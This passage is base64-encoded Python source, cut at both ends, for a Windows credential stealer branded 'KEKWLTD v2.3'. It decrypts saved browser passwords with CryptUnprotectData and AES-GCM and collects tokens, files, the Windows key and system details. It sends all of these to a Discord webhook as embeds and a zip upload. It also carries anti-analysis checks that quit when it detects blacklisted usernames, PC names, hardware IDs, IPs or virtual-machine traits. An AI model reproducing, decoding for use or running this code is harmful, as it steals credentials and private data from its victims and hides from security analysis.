BzZWxmLmNvdW50cnkgZWxzZSAiTi9BIn1gYGAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICcnJy5yZXBsYWNlKCcgJywgJycpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lubGluZSc6IFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiAnXHUyMDBiJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IGYnJydgYGBmaXgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb21wdXRlciBOYW1lOiB7dmN0bV9wYy5yZXBsYWNlKCIgIiwgIiAiKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXaW5kb3dzIEtleToge3NlbGYudzFuazMzeS5yZXBsYWNlKCIgIiwgIiAiKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXaW5kb3dzIFZlcjoge3NlbGYudzFudjNyLnJlcGxhY2UoIiAiLCAiICIpfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpc2sgU3RvY2thZ2U6IHtkMXNrfUdCCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmFtIFN0b2NrYWdlOiB7cjRtfUdCYGBgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJycucmVwbGFjZSgnICcsICcnKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpbmxpbmUnOiBUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogJyoqLSBUb2tlbnM6KionLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZicnJ2BgYHlhbWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7dG9rZW5zIGlmIHRva2VucyBlbHNlICJ0b2tlbnMgbm90IGZvdW5kIn1gYGAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICcnJy5yZXBsYWNlKCcgJywgJycpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lubGluZSc6IEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogZmlsZUNvdW50LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZicnJ2BgYGluaQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7ZmlsZXNfZm91bmQuc3RyaXAoKX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdYGBgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnJycucmVwbGFjZSgnICcsICcnKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpbmxpbmUnOiBGYWxzZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICAgICAnZm9vdGVyJzogewogICAgICAgICAgICAgICAgICAgICAgICAndGV4dCc6ICdLRUtXTFRE44O7aHR0cHM6Ly9rZWt3bHRkLnJ1JwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXQogICAgICAgIH0KCgogICAgICAgIHdpdGggb3BlbihfemlwZmlsZSwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgaWYgc2VsZi5yZWdleF93ZWJob29rX2RzYyBpbiBzZWxmLmRpc2NvcmRfd2ViaG9vazoKICAgICAgICAgICAgICAgIGh0dHB4LnBvc3Qoc2VsZi5kaXNjb3JkX3dlYmhvb2ssIGpzb249ZW1iZWQpCiAgICAgICAgICAgICAgICBodHRweC5wb3N0KHNlbGYuZGlzY29yZF93ZWJob29rLCBmaWxlcz17J3VwbG9hZF9maWxlJzogZn0pCiAgICAgICAgb3MucmVtb3ZlKF96aXBmaWxlKQoKCgoKCgoKY2xhc3MgTm9EZWJ1Z2coRnVuY3Rpb25zKToKICAgIGluVk0gPSBGYWxzZQoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLnByb2Nlc3NlcyA9IGxpc3QoKQoKICAgICAgICBzZWxmLmJsdXNldXJzID0gWwogICAgICAgICAgICAiV0RBR1V0aWxpdHlBY2NvdW50IiwgIkJ2SkNoUlBuc3huIiwgIkhhcnJ5IEpvaG5zb24iLCAiU3FnRk9mM0ciLCAiUkd6Y0JVeXJ6blJlZyIsICJoN2RrMXhQciIsIlJvYmVydCIsICJBYmJ5IiwgIlBldGVyIFdpbHNvbiIsICJobWFyYyIsICJwYXRleCIsICJKT0hOLVBDIiwgIlJEaEowQ05GZXZ6WCIsICJrRWVjZk13Z2oiLCAiRnJhbmsiLCAiOE5sMENvbE5RNWJxIiwKICAgICAgICAgICAgIkxpc2EiLCAiSm9obiIsICJnZW9yZ2UiLCAiUHhtZFVPcFZ5eCIsICI4Vml6U00iLCAidzBmanVPVm1DY1A1QSIsICJsbVZ3amo5YiIsICJQcU9OakhWd2V4c1MiLCAiM3UydjltOCIsICJKdWxpYSIsICJIRVVlUnpsIiwKICAgICAgICBdCiAgICAgICAgc2VsZi5ibHBjbmFtZSA9IFsKICAgICAgICAgICAgIkRFU0tUT1AtQ0RMTlZPUSIsICJCRUU3MzcwQy04QzBDLTQiLCAiREVTS1RPUC1OQUtGRk1UIiwgIldJTi01RTA3Q09TOUFMUiIsICJCMzBGMDI0Mi0xQzZBLTQiLCAiREVTS1RPUC1WUlNRTEFHIiwgIlE5SUFUUktQUkgiLCAiWEM2NFpCIiwgIkRFU0tUT1AtRDAxOUdETSIsCiAgICAgICAgICAgICJERVNLVE9QLVdJOENMRVQiLCAiU0VSVkVSMSIsICJMSVNBLVBDIiwgIkpPSE4tUEMiLCAiREVTS1RPUC1CMFQ5M0Q2IiwgIkRFU0tUT1AtMVBZS1AyOSIsICJERVNLVE9QLTFZMjQzM1IiLCAiV0lMRVlQQyIsICJXT1JLIiwgIjZDNEU3MzNGLUMyRDktNCIsCiAgICAgICAgICAgICJSQUxQSFMtUEMiLCAiREVTS1RPUC1XRzNNWUpTIiwgIkRFU0tUT1AtN1hDNkdFWiIsICJERVNLVE9QLTVPVjlTME8iLCAiUWFyWmhyZEJwaiIsICJPUkVMRUVQQyIsICJBUkNISUJBTERQQyIsICJKVUxJQS1QQyIsICJkMWJuSmtmVmxIIiwgIkRFU0tUT1AtQjBUOTNENiIKICAgICAgICBdCiAgICAgICAgc2VsZi5ibGh3aWQgPSBbCiAgICAgICAgICAgICI3QUI1QzQ5NC0zOUY1LTQ5NDEtOTE2My00N0Y1NEQ2RDUwMTYiLCAiMDMyRTAyQjQtMDQ5OS0wNUMzLTA4MDYtM0MwNzAwMDgwMDA5IiwgIjAzREUwMjk0LTA0ODAtMDVERS0xQTA2LTM1MDcwMDA4MDAwOSIsCiAgICAgICAgICAgICIxMTExMTExMS0yMjIyLTMzMzMtNDQ0NC01NTU1NTU1NTU1NTUiLCAiNkYzQ0E1RUMtQkVDOS00QTRELTgyNzQtMTExNjhGNjQwMDU4IiwgIkFERUVFRTlFLUVGMEEtNkI4NC1CMTRCLUI4M0E1NEFGQzU0OCIsCiAgICAgICAgICAgICI0QzRDNDU0NC0wMDUwLTM3MTAtODA1OC1DQUMwNEY1OTM0NEEiLCAiMDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtQUMxRjZCRDA0OTcyIiwgIjc5QUY1Mjc5LTE2Q0YtNDA5NC05NzU4LUY4OEE2MTZEODFCNCIsCiAgICAgICAgICAgICI1QkQyNEQ1Ni03ODlGLTg0NjgtN0NEQy1DQUE3MjIyQ0MxMjEiLCAiNDk0MzRENTMtMDIwMC05MDY1LTI1MDAtNjU5MDI1MDBFNDM5IiwgIjQ5NDM0RDUzLTAyMDAtOTAzNi0yNTAwLTM2OTAyNTAwRjAyMiIsCiAgICAgICAgICAgICI3NzdEODRCMy04OEQxLTQ1MUMtOTNFNC1EMjM1MTc3NDIwQTciLCAiNDk0MzRENTMtMDIwMC05MDM2LTI1MDAtMzY5MDI1MDAwQzY1IiwgIkIxMTEyMDQyLTUyRTgtRTI1Qi0zNjU1LTZBNEY1NDE1NURCRiIsCiAgICAgICAgICAgICIwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC1BQzFGNkJEMDQ4RkUiLCAiRUIxNjkyNEItRkI2RC00RkExLTg2NjYtMTdCOTFGNjJGQjM3IiwgIkExNUE5MzBDLTgyNTEtOTY0NS1BRjYzLUU0NUFENzI4QzIwQyIsCiAgICAgICAgICAgICI2N0U1OTVFQi01NEFDLTRGRjAtQjVFMy0zREE3QzdCNTQ3RTMiLCAiQzdEMjMzNDItQTVENC02OEExLTU5QUMtQ0Y0MEY3MzVCMzYzIiwgIjYzMjAzMzQyLTBFQjAtQUExQS00REY1LTNGQjM3REJCMDY3MCIsCiAgICAgICAgICAgICI0NEI5NEQ1Ni02NUFCLURDMDItODZBMC05ODE0M0E3NDIzQkYiLCAiNjYwODAwM0YtRUNFNC00OTRFLUIwN0UtMUM0NjE1RDFEOTNDIiwgIkQ5MTQyMDQyLThGNTEtNUVGRi1ENUY4LUVFOUFFM0QxNjAyQSIsCiAgICAgICAgICAgICI0OTQzNEQ1My0wMjAwLTkwMzYtMjUwMC0zNjkwMjUwMDNBRjAiLCAiOEI0RTgyNzgtNTI1Qy03MzQzLUI4MjUtMjgwQUVCQ0QzQkNCIiwgIjRENEREQzk0LUUwNkMtNDRGNC05NUZFLTMzQTFBREE1QUMyNyIsCiAgICAgICAgICAgICJCQjY0RTA0NC04N0JBLUM4NDctQkMwQS1DNzk3RDFBMTZBNTAiLCAiMkU2RkI1OTQtOUQ1NS00NDI0LThFNzQtQ0UyNUEyNUUzNkIwIiwgIjQyQTgyMDQyLTNGMTMtNTEyRi01RTNELTZCRjRGRkZEODUxOCIKICAgICAgICBdCiAgICAgICAgc2VsZi5ibGlwcyA9IFsKICAgICAgICAgICAgJzg4LjEzMi4yMzEuNzEnLCAnNzguMTM5LjguNTAnLCAnMjAuOTkuMTYwLjE3MycsICc4OC4xNTMuMTk5LjE2OScsICc4NC4xNDcuNjIuMTInLCAKICAgICAgICAgICAgJzE5NC4xNTQuNzguMTYwJywgJzkyLjIxMS4xMDkuMTYwJywgJzE5NS43NC43Ni4yMjInLCAnMTg4LjEwNS45MS4xMTYnLCAnMzQuMTA1LjE4My42OCcsIAogICAgICAgICAgICAnOTIuMjExLjU1LjE5OScsICc3OS4xMDQuMjA5LjMzJywgJzk1LjI1LjIwNC45MCcsICczNC4xNDUuODkuMTc0JywgJzEwOS43NC4xNTQuOTAnLCAKICAgICAgICAgICAgJzEwOS4xNDUuMTczLjE2OScsICczNC4xNDEuMTQ2LjExNCcsICcyMTIuMTE5LjIyNy4xNTEnLCAnMTk1LjIzOS41MS41OScsICcxOTIuNDAuNTcuMjM0JywgCiAgICAgICAgICAgICc2NC4xMjQuMTIuMTYyJywgJzM0LjE0Mi43NC4yMjAnLCAnMTg4LjEwNS45MS4xNzMnLCAnMTA5Ljc0LjE1NC45MScsICczNC4xMDUuNzIuMjQxJywKICAgICAgICAgICAgICcxMDkuNzQuMTU0LjkyJywgJzIxMy4zMy4xNDIuNTAnLCAnMTA5Ljc0LjE1NC45MScsICc5My4yMTYuNzUuMjA5JywgJzE5Mi44Ny4yOC4xMDMnLCAKICAgICAgICAgICAgICc4OC4xMzIuMjI2LjIwMycsICcxOTUuMTgxLjE3NS4xMDUnLCAnODguMTMyLjIyNS4xMDAnLCAnOTIuMjExLjE5Mi4xNDQnLCAnMzQuODMuNDYuMTMwJywgCiAgICAgICAgICAgICAnMTg4LjEwNS45MS4xNDMnLCAnMzQuODUuMjQzLjI0MScsICczNC4xNDEuMjQ1LjI1JywgJzE3OC4yMzkuMTY1LjcwJywgJzg0LjE0Ny41NC4xMTMnLCAKICAgICAgICAgICAgICcxOTMuMTI4LjExNC40NScsICc5NS4yNS44MS4yNCcsICc5Mi4yMTEuNTIuNjInLCAnODguMTMyLjIyNy4yMzgnLCAnMzUuMTk5LjYuMTMnLCAKICAgICAgICAgICAgICc4MC4yMTEuMC45NycsICczNC44NS4yNTMuMTcwJywgJzIzLjEyOC4yNDguNDYnLCAnMzUuMjI5LjY5LjIyNycsICczNC4xMzguOTYuMjMnLCAKICAgICAgICAgICAgICcxOTIuMjExLjExMC43NCcsICczNS4yMzcuNDcuMTInLCAnODcuMTY2LjUwLjIxMycsICczNC4yNTMuMjQ4LjIyOCcsICcyMTIuMTE5LjIyNy4xNjcnLCAKICAgICAgICAgICAgICcxOTMuMjI1LjE5My4yMDEnLCAnMzQuMTQ1LjE5NS41OCcsICczNC4xMDUuMC4yNycsICcxOTUuMjM5LjUxLjMnLCAnMzUuMTkyLjkzLjEwNycKICAgICAgICAgICAgIF0KCiAgICAgICAgZm9yIGZ1bmMgaW4gW3NlbGYubHN0Y2hlYywgc2VsZi5yZWdrZXksIHNlbGYuc3AzY0NoZXFdOgogICAgICAgICAgICBwcm9jZXNzID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZnVuYywgZGFlbW9uPVRydWUpCiAgICAgICAgICAgIHNlbGYucHJvY2Vzc2VzLmFwcGVuZChwcm9jZXNzKQogICAgICAgICAgICBwcm9jZXNzLnN0YXJ0KCkKICAgICAgICBmb3IgdCBpbiBzZWxmLnByb2Nlc3NlczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdC5qb2luKCkKICAgICAgICAgICAgZXhjZXB0IFJ1bnRpbWVFcnJvcjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgZGVmIHByb2dyYW1FeGl0KHNlbGYpOgogICAgICAgIHNlbGYuX19jbGFzc19fLmluVk0gPSBUcnVlCgogICAgZGVmIGxzdGNoZWMoc2VsZik6CiAgICAgICAgZm9yIHBhdGggaW4gW3InRDpcVG9vbHMnLCByJ0Q6XE9TMicsIHInRDpcTlQzWCddOgogICAgICAgICAgICBpZiBudHBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCgogICAgICAgIGZvciB1c2VyIGluIHNlbGYuYmx1c2V1cnM6CiAgICAgICAgICAgIGlmIGluZm9jb20gPT0gdXNlcjoKICAgICAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQoKICAgICAgICBmb3IgcGNOYW1lIGluIHNlbGYuYmxwY25hbWU6CiAgICAgICAgICAgIGlmIHZjdG1fcGMgPT0gcGNOYW1lOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCgogICAgICAgIGZvciBwY0lQIGluIHNlbGYuYmxpcHM6CiAgICAgICAgICAgIGlmIHNlbGYubmV0XzFmbygpWzBdID09IHBjSVA6CiAgICAgICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICAgICAgZm9yIHV1aWR3bmR6IGluIHNlbGYuYmxod2lkOgogICAgICAgICAgICBpZiBzZWxmLnN5c18xZm8oKVswXSA9PSB1dWlkd25kejoKICAgICAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQoKICAgIGRlZiBzcDNjQ2hlcShzZWxmKToKICAgICAgICBpZiBpbnQocjRtKSA8PSAzOiAKICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCiAgICAgICAgaWYgaW50KGQxc2spIDw9IDEyMDogIAogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKICAgICAgICBpZiBpbnQocHN1dGlsLmNwdV9jb3VudCgpKSA8PSAxOgogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICBkZWYgcmVna2V5KHNlbGYpOgogICAgICAgIHJlZzEgPSBvcy5zeXN0ZW0oIlJFRyBRVUVSWSBIS0VZX0xPQ0FMX01BQ0hJTkVcXFNZU1RFTVxcQ29udHJvbFNldDAwMVxcQ29udHJvbFxcQ2xhc3NcXHs0RDM2RTk2OC1FMzI1LTExQ0UtQkZDMS0wODAwMkJFMTAzMTh9XFwwMDAwXFxEcml2ZXJEZXNjIDI+IG51bCIpCiAgICAgICAgcmVnMiA9IG9zLnN5c3RlbSgiUkVHIFFVRVJZIEhLRVlfTE9DQUxfTUFDSElORVxcU1lTVEVNXFxDb250cm9sU2V0MDAxXFxDb250cm9sXFxDbGFzc1xcezREMzZFOTY4LUUzMjUtMTFDRS1CRkMxLTA4MDAyQkUxMDMxOH1cXDAwMDBcXFByb3ZpZGVyTmFtZSAyPiBudWwiKQogICAgICAgIGlmIChyZWcxIGFuZCByZWcyKSAhPSAxOgogICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICAgICAgaGFuZGxlID0gd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfTE9DQUxfTUFDSElORSwgJ1NZU1RFTVxcQ3VycmVudENvbnRyb2xTZXRcXFNlcnZpY2VzXFxEaXNrXFxFbnVtJykKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlZ192YWwgPSB3aW5yZWcuUXVlcnlWYWx1ZUV4KGhhbmRsZSwgJzAnKVswXQogICAgICAgICAgICBpZiAoIlZNd2FyZSIgb3IgIlZCT1giKSBpbiByZWdfdmFsOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgd2lucmVnLkNsb3NlS2V5KGhhbmRsZSkKCgoKCgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIiBhbmQgb3MubmFtZSA9PSAibnQiOgogICAgYXN5bmNpby5ydW4oYmNfaW5pdGlhbF9mdW5jKCkuaW5pdCgpKQogICAgCgoKCgpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCnRlbXAgPSBvcy5nZXRlbnYoIlRFTVAiKQpUaHJlYWRsaXN0ID0gW10KCmRlZiBmZXRjaF9jb25mKGU6IHN0cikgLT4gc3RyIG9yIGJvb2wgfCBOb25lOgogICAgICAgIHJldHVybiBfX2NvbmZpZ19fLmdldChlKQoKaG9vayA9IGZldGNoX2NvbmYoInlvdXJ3ZWJob29rdXJsIikKCmNsYXNzIERBVEFfQkxPQihTdHJ1Y3R1cmUpOgogICAgX2ZpZWxkc18gPSBbCiAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksCiAgICAgICAgKCdwYkRhdGEnLCBQT0lOVEVSKGNfY2hhcikpCiAgICBdCgpkZWYgR2V0RGF0YShibG9iX291dCk6CiAgICBjYkRhdGEgPSBpbnQoYmxvYl9vdXQuY2JEYXRhKQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhCiAgICBidWZmZXIgPSBjX2J1ZmZlcihjYkRhdGEpCiAgICBjZGxsLm1zdmNydC5tZW1jcHkoYnVmZmVyLCBwYkRhdGEsIGNiRGF0YSkKICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQogICAgcmV0dXJuIGJ1ZmZlci5yYXcKCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6CiAgICBidWZmZXJfaW4gPSBjX2J1ZmZlcihlbmNyeXB0ZWRfYnl0ZXMsIGxlbihlbmNyeXB0ZWRfYnl0ZXMpKQogICAgYnVmZmVyX2VudHJvcHkgPSBjX2J1ZmZlcihlbnRyb3B5LCBsZW4oZW50cm9weSkpCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pCiAgICBibG9iX2VudHJvcHkgPSBEQVRBX0JMT0IobGVuKGVudHJvcHkpLCBidWZmZXJfZW50cm9weSkKICAgIGJsb2Jfb3V0ID0gREFUQV9CTE9CKCkKCiAgICBpZiB3aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoYnlyZWYoYmxvYl9pbiksIE5vbmUsIGJ5cmVmKGJsb2JfZW50cm9weSksIE5vbmUsIE5vbmUsIDB4MDEsIGJ5cmVmKGJsb2Jfb3V0KSk6CiAgICAgICAgcmV0dXJuIEdldERhdGEoYmxvYl9vdXQpCgpkZWYgRGVjcnlwdFZhbHVlKGJ1ZmYsIG1hc3Rlcl9rZXk9Tm9uZSk6CiAgICBzdGFydHMgPSBidWZmLmRlY29kZShlbmNvZGluZz0ndXRmOCcsIGVycm9ycz0naWdub3JlJylbOjNdCiAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOgogICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKCmRlZiBMb2FkUmVxdWVzdHMobWV0aG9kZSwgdXJsLCBkYXRhPScnLCBmaWxlcz0nJywgaGVhZGVycz0nJyk6CiAgICBmb3IgaSBpbiByYW5nZSg4KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIG1ldGhvZGUgPT0gJ1BPU1QnOgogICAgICAgICAgICAgICAgaWYgZGF0YSAhPSAnJzoKICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSkKICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgICAgIGVsaWYgZmlsZXMgIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBmaWxlcz1maWxlcykKICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMCBvciByLnN0YXR1c19jb2RlID09IDQxMzogIyA0MTMgPSBEQVRBIFRPIEJJRwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKZGVmIExvYWRVcmxpYihob29rLCBkYXRhPScnLCBmaWxlcz0nJywgaGVhZGVycz0nJyk6CiAgICBmb3IgaSBpbiByYW5nZSg4KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIGhlYWRlcnMgIT0gJyc6CiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByID0gdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZGF0YSkpCiAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKCmRlZiBUcnVzdChDb29raWVzKToKICAgIGdsb2JhbCBERVRFQ1RFRAogICAgZGF0YSA9IHN0cihDb29raWVzKQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQogICAgaWYgbGVuKHRpbSkgPCAtMToKICAgICAgICBERVRFQ1RFRCA9IFRydWUKICAgICAgICByZXR1cm4gREVURUNURUQKICAgIGVsc2U6CiAgICAgICAgREVURUNURUQgPSBGYWxzZQogICAgICAgIHJldHVybiBERVRFQ1RFRAoKCgoKZGVmIFJlZm9ybWF0KGxpc3R0KToKICAgIGUgPSByZS5maW5kYWxsKCIoXHcrW2Etel0pIixsaXN0dCkKICAgIHdoaWxlICJodHRwcyIgaW4gZTogZS5yZW1vdmUoImh0dHBzIikKICAgIHdoaWxlICJjb20iIGluIGU6IGUucmVtb3ZlKCJjb20iKQogICAgd2hpbGUgIm5ldCIgaW4gZTogZS5yZW1vdmUoIm5ldCIpCiAgICByZXR1cm4gbGlzdChzZXQoZSkpCgpkZWYgdXBsb2FkKG5hbWUsIHRrPScnKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KCiAgICBpZiBuYW1lID09ICJiY19jaGVja2luZyI6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6ICcnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIkludGVyZXN0aW5nIGZpbGVzIGZvdW5kIG9uIHVzZXIgUEM6IiwKICAgICAgICAgICAgICAgICJ2YWx1ZSI6IHRrCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAnbmFtZSc6IGYnS0VLV0xURCB2Mi4zJywKICAgICAgICAgICAgICAgICd1cmwnOiAnaHR0cHM6Ly9rZWt3bHRkLnJ1JywKICAgICAgICAgICAgICAgICdpY29uX3VybCc6ICdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzLzIyODU0OTExMzU4MTUzNTIzNS80MzBmODFlYWQ2N2VhZmZjYWZmYmI2ZTdiMGFmMjkyNy5wbmcnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6ICJrZWt3bHRkLnJ1IgogICAgICAgICAgICB9LAogICAgICAgICAgICAnY29sb3InOiAzNzQyNzYsCiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMjI4NTQ5MTEzNTgxNTM1MjM1LzQzMGY4MWVhZDY3ZWFmZmNhZmZiYjZlN2IwYWYyOTI3LnBuZyIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICB9CiAgICAgICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICByZXR1cm4KCiAgICBwYXRoID0gbmFtZQogICAgZmlsZXMgPSB7J2ZpbGUnOiBvcGVuKHBhdGgsICdyYicpfQoKICAgIGlmICJiY19hbGxwYXNzd29yZHMiIGluIG5hbWU6CgogICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcGFzd1dvcmRzKQoKICAgICAgICBpZiBsZW4ocmEpID4gMTAwMDoKICAgICAgICAgICAgcnJyID0gUmVmb3JtYXQoc3RyKHBhc3dXb3JkcykpCiAgICAgICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcnJyKQoKICAgICAgICBkYXRhID0gewogICAgICAgICJjb250ZW50IjogJycsCiAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgewogICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgIm5hbWUiOiAiUGFzc3dvcmRzIEZvdW5kOiIsCiAgICAgICAgICAgICAgICAidmFsdWUiOiByYQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgJ25hbWUnOiBmJ0tFS1dMVEQgdjIuMycsCiAgICAgICAgICAgICAgICAndXJsJzogJ2h0dHBzOi8va2Vrd2x0ZC5ydScsCiAgICAgICAgICAgICAgICAnaWNvbl91cmwnOiAnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8yMjg1NDkxMTM1ODE1MzUyMzUvNDMwZjgxZWFkNjdlYWZmY2FmZmJiNmU3YjBhZjI5MjcucG5nJwogICAgICAgICAgICB9LAogICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgInRleHQiOiAia2Vrd2x0ZC5ydSIsCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICdjb2xvcic6IDM3NDI3NiwKICAgICAgICAgICAgfQogICAgICAgIF0sCiAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMjI4NTQ5MTEzNTgxNTM1MjM1LzQzMGY4MWVhZDY3ZWFmZmNhZmZiYjZlN2IwYWYyOTI3LnBuZyIsCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICB9CiAgICAgICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCiAgICBpZiAiYmNfYWxs